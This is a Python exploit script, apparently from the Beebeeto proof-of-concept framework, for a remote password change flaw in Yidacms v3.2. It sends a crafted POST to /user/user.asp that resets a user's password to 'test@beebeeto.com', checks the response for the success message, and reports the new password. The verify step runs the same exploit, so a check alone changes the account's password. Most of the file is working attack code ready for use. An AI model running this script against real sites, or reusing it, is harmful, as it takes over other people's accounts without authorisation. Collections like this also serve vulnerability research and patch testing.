#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import requests


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0217',
            'name': 'Yidacms v3.2 /Yidacms/user/user.asp 远程密码修改漏洞 Exploit',
            'author': 'user1018',
            'create_date': '2014-12-27',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Yidacms',
            'vul_version': ['3.2'],
            'type': 'Remote Password Change',
            'tag': ['Yidacms漏洞', 'Yidacms远程密码修改漏洞', 'asp'],
            'desc': '重置密码时没有对帐号和原密码进行校验,导致可以任意重置任何用户密码',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-073901',
                           ],
        },
    }


    @classmethod
    def exploit(cls, args):
        vul_path = '%s/user/user.asp?yidacms=password&id=3'
        verify_url = vul_path % args['options']['target']

        data = {
            'shuaiweb_userpass':'test@beebeeto.com',
            'shuaiweb_userpass2':'test@beebeeto.com',
            'shuaiweb_useremail':'test@beebeeto.com',
            'shuaiweb_username': urllib.unquote('%CE%D2%B7%AE%BB%AA'),
            'shuaiweb_usertel': '',
            'shuaiweb_userqq': '',
            'shuaiweb_usermsn': '',
            'shuaiweb_useraddress': ''
        }

        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url

        response = requests.post(verify_url, data=data)
        content = response.content
        if u'alert(\'修改成功！\');location.replace(\'user_pass.asp\')' in content.decode('GBK'):
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['password'] = 'test@beebeeto.com'
        return args


    verify = exploit


if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())